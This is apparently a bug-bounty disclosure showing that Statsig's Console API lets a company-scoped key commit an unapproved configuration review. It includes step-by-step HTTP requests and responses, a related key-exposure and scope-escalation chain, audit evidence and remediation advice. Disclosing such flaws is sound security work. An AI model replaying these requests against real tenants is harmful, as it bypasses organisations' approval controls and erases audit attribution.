# Statsig Console — review/approval control is bypassable: `commit` is the only review verb that does not resolve an acting user, so a company-scoped key commits an **unapproved** review and the change goes live

**Target Location:** https://statsigapi.net/console/v1 (Statsig Console API)
**Target category:** Web App
**VRT (suggested):** Broken Access Control > Privilege Escalation
**CVSS 3.1 (suggested):** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5 (Medium)** — computed, not asserted

*Calibration note:* if a triager holds that the review policy being off on our tenant (`is_config_review_required: false`, `requiredReview: false` on the probe gate) makes the integrity consequence moot, the disputed term is only `I:H → I:L`, which drops the score to **3.5 (Low)**. We believe that reading is refuted by the evidence below (§ "Controls — what bounds this"): the identical request with a personal key is refused `403 missing_commit_permission` in the same policy state, so the credential class — not the policy — is the variable.

---

**Affected Asset:** Statsig Console API — review-family routes `PUT /console/v1/{gates|dynamic_configs|experiments|autotunes|segments}/{id}/reviews/{reviewId}/commit`, acting on our own project `4n6HCY59mDqwX1iSZQtNvx` only. No third-party data touched; tenant reverted after testing.

**Summary:** Statsig's configuration-review workflow is guarded by one check that every mutating verb in the review family is supposed to make: **resolve the acting user behind the credential**. Four of the five verbs do it — `create`, `approve`, `reject`, and `delete` on a company-scoped (`owner: null`) CONSOLE key all refuse with `400 {"key":"on_behalf_of_required"}`. `commit` does not. Held against the same tenant, the same gate, the same review, and the same credential class, the verb is the only variable:

```
company-scoped CONSOLE key  (owner: null, scopes ["omni_read_write"])
  POST   /console/v1/gates/{id}/reviews                      -> 400  on_behalf_of_required
  PUT    /console/v1/gates/{id}/reviews/{rid}/approve        -> 400  on_behalf_of_required
  PUT    /console/v1/gates/{id}/reviews/{rid}/reject         -> 400  on_behalf_of_required
  DELETE /console/v1/gates/{id}/reviews/{rid}                -> 400  on_behalf_of_required

  PUT    /console/v1/gates/{id}/reviews/{rid}/commit         -> 200  "Gate review committed successfully"
                                                              ...on a review that was NEVER approved.
```

The checks that would have stopped the commit **exist and work — on the Member's own personal key**:

```
Member's personal key, PUT .../reviews/{rid}/approve  -> 403 self_approval_blocked
   "The review author cannot approve their own review. To self-approve a change (when the config
    permits self-approval), commit the review directly instead of approving it."
Member's personal key, PUT .../reviews/{rid}/commit   -> 403 missing_commit_permission
   "Committing a review that has not been separately approved requires the \"skip_config_review\" permission."
```

The second message is the vendor stating the intended design in its own words: committing without a separate approval is a **permission-gated** action (`skip_config_review`). On the class-key path no acting user is ever resolved, so the check is evaluated **against the credential's own scope list instead of a resolved user's**. A follow-up control isolates this precisely: a read-only class key (`["omni_read_only"]`) on the *same* review gets `403 missing_commit_permission`; the same key after the Member self-services its scopes to `["omni_read_write"]` (via `UpdateSDKKeyScopes`, `200`, key value byte-identical) commits the *same* review with `200`. The check runs — against the wrong subject. This bounds the finding honestly: a read-only class key cannot exploit it.

The result is a production change that lands with **no approval, no reviewer, and no attributable actor**:

```
gate  rb_probe_gate:   isEnabled  true -> false     version 3 -> 4     lastModifierEmail: null
review R1:             status  pending -> committed                    reviewers: []
audit:  config_review_commit   updatedBy "CONSOLE API - console-9q…"   modifierEmail: null
```

**Steps to Reproduce:**

All requests were run in this order against our own tenant (Company `4n6HCY59mDqwX1iSZQtNvx`; A = Owner `mohamed-9499-2@agentmail.to`, id `nZ2wI4FMJek95vjJHdnWR`; B = Member `mohamed-9499-3@agentmail.to`, id `13B13WHITpDKkMpbi22BGW`). Secrets masked `first10…last4`.

Credentials:
```
K_class   console-9q…df7i   id 6PqmVNbso37K9JfaSqwcx7   owner: null   scopes ["omni_read_write"]
K_mp      console-Jd…NK9Z   id 6VgLPTFcVbPpo166GQ10zf   owner 13B13WHITpDKkMpbi22BGW  ["personal_read_write"]
```

**Step 1 — clearest end-to-end reproduction (gates family).**

1.1. Member creates gate `rb_probe_gate` and a pending review on it with their own personal key (server itself returns the `commit` link):
```
POST /console/v1/gates/rb_probe_gate/reviews HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: console-Jd…NK9Z
Content-Type: application/json

{"change":{"is_enabled":false}}
```
```
HTTP/1.1 201 Created
{"message":"Review created successfully.","data":{
  "review_id":"m2gpRfjAA9UB6JG9SS0iR","status":"pending","type":"toggle_enabled",
  "author":{"id":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to"},
  "reviewers":[],
  "links":{"commit":"/console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit"}}}
```

1.2. **Personal-key control** — the same review, the same absence of an approval, with the Member's own key:
```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit HTTP/1.1
STATSIG-API-KEY: console-Jd…NK9Z
```
```
HTTP/1.1 403 Forbidden
{"message":"Committing a review that has not been separately approved requires the \"skip_config_review\" permission.","status":403,"key":"missing_commit_permission"}
```
(Sibling control: `approve` with the same personal key → `403 self_approval_blocked`.)

1.3. **The bypass** — same review, no approval event ever recorded (`reviewers: []`; `approve` refused for both credentials), no body, no `x-on-behalf-of`:
```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: console-9q…df7i
```
```
HTTP/1.1 200 OK
{"message":"Gate review committed successfully"}
```

1.4. Read-back through an independent route:
```
GET /console/v1/gates/rb_probe_gate HTTP/1.1
STATSIG-API-KEY: console-9q…df7i
```
```
HTTP/1.1 200 OK
{"data":{"id":"rb_probe_gate","isEnabled": false, "version": 4, "status":"Disabled",
         "lastModifierID":"6PqmVNbso37K9JfaSqwcx7","lastModifierEmail": null,
         "lastModifierName":"CONSOLE API - console-9q…", ...}}
```
`GET .../reviews/m2gpRfjAA9UB6JG9SS0iR` → `status: "committed"`, `reviewers: []`. **`isEnabled true → false`, `version 3 → 4`, review `pending → committed` — the change is live and the approval step never happened.**

1.5. Audit trail (attribution loss):
```
GET /console/v1/audit_logs HTTP/1.1
```
```
[{"actionType":"config_review_commit","name":"rb_probe_gate",
  "time":"14:10:44 GMT+0000","updatedBy":"CONSOLE API - console-9q…",
  "updatedByUserID":"6PqmVNbso37K9JfaSqwcx7","modifierEmail": null},
 {"actionType":"config_state_toggle","name":"rb_probe_gate",
  "time":"14:10:44 GMT+0000","updatedBy":"CONSOLE API - console-9q…","modifierEmail": null,
  "changes":{"enabled":{"new":false,"old":true}}},
 {"actionType":"config_review_create","name":"rb_probe_gate",
  "time":"14:10:34 GMT+0000","updatedBy":"Bruno Hunter via CONSOLE API",
  "modifierEmail":"mohamed-9499-3@agentmail.to"}]
```
Review created at 14:10:34, attributed to a person. Committed at 14:10:44, attributed to a credential (`modifierEmail: null`). No approval event anywhere between. **No reviewer, no approval, no person.** The legitimate path, run for contrast on dynamic_configs, attributes every row to a named human (`modifierEmail` populated on create/accept/commit) — proving the system is capable of attribution and the bypass simply never resolves an actor.

**Step 2 — 2026-10-17 retest: the bypass confirmed end to end on a fifth family (autotunes).**

A Member personal key created autotune `r1_t4_at_b` with pending review `2r70Ik5tDJw2qIXuVDN0nF` (review *create* with the class key correctly returned `400 on_behalf_of_required` — the misplaced-guard signature holds here too), and the class key then executed:
```
PUT /console/v1/autotunes/r1_t4_at_b/reviews/2r70Ik5tDJw2qIXuVDN0nF/commit HTTP/1.1
STATSIG-API-KEY: console-h46kKOB***   (owner: null, company-scoped)
```
```
HTTP/1.1 200 OK
{"message":"Autotune review committed successfully"}
```
`isStarted: false → true`, audit actor `"CONSOLE API - console-h46kKOB***"` with `modifierEmail: null`. Notably, on the Member's personal key the autotunes `commit` path refuses with a **role** check — *"your role is not permitted to skip the pre-commit webhook workflow"* — which can only execute against a resolved principal; the class key succeeds on the identical request, proving the principal is resolved on one path and not the other. **Coverage is now 5/5 commit routes demonstrated or route-resolved:** gates + dynamic_configs (end to end), segments (sibling-pair signature, below), experiments (route resolves to object lookup), autotunes (end to end, 2026-10-17).

**Step 3 — structural evidence: the segments sibling pair (guard misplaced, not absent).**

Acting-user resolution is pre-lookup middleware on every review-mutating verb except `commit`, and `segments`' own verb pair disagrees with itself:
```
DELETE /console/v1/segments/{id}/reviews/zzfm-nope-0000000000            (class key)
   -> 400 {"key":"on_behalf_of_required"}        (guard fires BEFORE lookup)
PUT    /console/v1/segments/{id}/reviews/zzfm-nope-0000000000/commit    (class key)
   -> 404 {"message":"Review not found"}         (no guard; lookup happens first)
```
The same object, one verb with the middleware and one without — a route placement bug. Complementary fabricated-id control on gates: `PUT .../reviews/zzfm-nope-0000000000/commit` → `404 "Review not found"` (class key and personal key both), fabricated gate+review → `404 "Gate not found"` — **the commit route validates its object and refuses unknown ids, so the 200s above are real commits of real, never-approved reviews**, not a blind endpoint. Author-independence was also proven: an Owner-authored pending review is committed by the class key (`200`, gate v5, `lastModifierEmail: null`).

(Prerequisite, restated from the already-filed Member→Admin report so the chain is complete: the Member reads the `owner: null` class key in plaintext from the console key box via the Console GraphQL key list, and can raise an `["omni_read_only"]` key to `["omni_read_write"]` via `UpdateSDKKeyScopes` — `200`, audit-logged under the Member's identity. The Member **cannot create** such a key — `CreateSDKKey owner_id:null` → `"Must be admin of project"`; `POST /console/v1/keys` → `403 Insufficient permissions.` — and a project does not get one by default; the single precondition is that a company-scoped CONSOLE key exists, the normal state of any automation-wired project. An isolation experiment settles the "the Admin granted it" objection: one key value, only the scope differing — Arm 1 read-only commits → `403`; Member raises scopes → `200`; Arm 2 same review, same key value → `200` and the gate flips. The Admin created the object; **the Member set the permission that was used**.)

**Impact:**

- **Integrity — a change goes live with no approval and no reviewer.** A `pending` review authored by a Member is committed by a credential with no owning user; the gate flipped `isEnabled true → false` (v3→v4), the dynamic config the same (v2), the autotune started (`isStarted: true`). All re-read through an independent key class to confirm persistence.
- **The control that is supposed to gate the already-filed Member→Admin findings is itself bypassable.** An organisation that turned config review on as its mitigation for the filed findings is not protected by it — the writes those reports demonstrate can be landed through an unapproved commit.
- **Audit-trail integrity — the action is unattributable.** The commit records `updatedBy "CONSOLE API - console-…"` with `modifierEmail: null`. An investigator reading the review object sees a person; an investigator reading the audit trail sees a credential. Detection-wise, the response is indistinguishable from a legitimate commit (`200 "Gate review committed successfully"` both ways); the only signal is the `null` modifier on exactly the row that bypassed approval.
- **No confidentiality impact (C:N).** The bypass writes configuration; it discloses nothing the caller could not already read and stays inside a project the caller can already reach.

**Controls (what bounds this):**

- **Read-only class key control:** a `["omni_read_only"]` class key on the same review gets `403 missing_commit_permission` — the bound. Only a read-*write* class key (or one the Member raises to read-write, which needs no admin) passes, because `skip_config_review` is satisfied by the credential's scope list rather than a resolved user's permissions.
- **`x-on-behalf-of` is a dead end — the bypass cannot be re-forged into a person.** Tested on `create` with three value shapes, all `400 on_behalf_of_required`; no working value was found anywhere, and `commit` was called with no such header at all. A static sweep of the shipped Console JS found **zero occurrences of `x-on-behalf-of` across 1238 JS files** (30 other `x-` carrier headers checked as a cross-check) — there is no client-side construction to learn or spoof, and no evidence the header resolves to a person at all on this surface.
- **Fabricated-id control:** unknown review/gate ids → `404` — the endpoint is not blind; the 200s are real commits.
- **Intra-project only.** Every call is inside our own project; no other tenant was addressed. No confidentiality term, no scope change (S:U).
- **Policy-state control:** project review policy was `is_config_review_required: false` and the gate carried `requiredReview: false` — yet the personal key is refused `403` in that same state while the class key gets `200` on the identical request. The policy state is not the variable; the credential class is.

**Why this is not a duplicate of the already-filed reports:**

- **vs. filed `8d4a107f` (key exposure / scope-escalation):** that report covers the **create-side setting and the Read-Only read path** — a Member reads company-scoped keys in plaintext and widens scopes via `UpdateSDKKeyScopes`. **The `commit` verb appears nowhere in that report**, nor does `/reviews`, `skip_config_review`, `on_behalf_of_required`, or any part of the review family. This finding is what those escalated credentials can then do to the *approval* control — a different endpoint family, a different broken check, a different remediation. It is the downstream consequence the filed report does not cover.
- **vs. the (being-filed) Member-to-Admin report:** that report is about **what a Member can write** — config writes and role assignment on the management surface (a role decision). **This report is about the control that is supposed to gate those writes** — the review/approval workflow — and shows that the approval control is bypassable without any human approving anything. The fixes are different: that report is fixed by tightening role/permission assignment; this one is fixed by **resolving the acting user on the `commit` verb** (one line in the shared review-mutation middleware, reference implementation already shipped on the four sibling verbs). The two share a root *pattern* — the Console API authorizes on the key, not the caller — and are otherwise disjoint. If the program prefers to treat the pattern as one root cause, this should be folded in as **additional impact** of the Member-to-Admin report rather than closed as a duplicate: the review-control bypass is the reason the filed writes cannot be caught by the product's own approval workflow, and that fact is absent from the filed report.
- **vs. other filed submissions** (ingestion SSRF, Guides & Surveys / taxonomy-shim / Agent-IDOR): different assets and mechanisms entirely; nothing here touches those backends.

**Remediation:**

1. **Resolve the acting user on `commit`, exactly as `create`/`approve`/`reject`/`delete` already do.** Refuse an `owner: null` key without a valid `x-on-behalf-of`, returning the existing `400 {"key":"on_behalf_of_required"}`. This is a one-line addition to the shared review-mutation middleware, not a new mechanism.
2. **Evaluate the approval precondition on the resolved identity.** Once an acting user exists, enforce what the personal-key path already enforces: an unapproved commit requires `skip_config_review` on that user (`403 missing_commit_permission`), and apply the `self_approval_blocked`/`allow_self_approval` decision to `commit`, since `commit` is the documented self-approval route.
3. **Make the middleware shared, not per-verb.** Wire acting-user resolution into the review-route group so a future verb cannot be added without it, and add a route-table test asserting `on_behalf_of_required` for every review-mutating route with an `owner: null` key.
4. **Attribute the audit row.** A commit through an `owner: null` key should record the resolved `modifierEmail` — or be refused per (1). `modifierEmail: null` on a `config_review_commit` row is the fingerprint of this defect class and is worth a detection rule of its own.
5. **Regression test:** with review required and a pending review authored by user B, assert (a) `owner: null` key on commit → `400 on_behalf_of_required`, (b) B's own key → `403 missing_commit_permission`, (c) approver's key → `200`, (d) `lastModifierEmail` never `null` on any outcome.

**Evidence to attach:**

- `escal/rb/v2_contrast.json` — THE CONTRAST: R1 created `201 pending`; four sibling refusals (`400 on_behalf_of_required`); personal-key refusals (`403 self_approval_blocked`, `403 missing_commit_permission`); read-back showing nothing moved; the class-key commit `200`; post-bypass read-back (`isEnabled false`, `version 4`, `lastModifierEmail null`); the audit trail.
- `escal/rb/v3_gaps.json` — fabricated review/gate ids `404`; Owner-authored review committed by class key (`200`, author-independence); dynamic_configs bypass end to end; experiments/autotunes/segments route probes.
- `escal/rb/v1_recon.json` — key minting, key-box reads for both sessions, baselines; `escal/rb/v3b_legit_and_family3.json` — the fully attributed legitimate path (create→approve→commit, every audit row carrying a `modifierEmail`).
- `escal/rb_calls.json` — every call, raw (105 rows). `escal/rb/v4_cleanup.json` / `v4b_final_state.json` — tenant restored (probe objects deleted, all probe keys revoked, roles untouched).
- 2026-10-17 autotunes retest transcript (commit `200`, `isStarted: true`, audit `modifierEmail: null`); segments sibling-pair transcripts.
- Static-analysis note: zero occurrences of `x-on-behalf-of` across 1238 shipped Console JS files (30 `x-` carrier headers cross-checked).
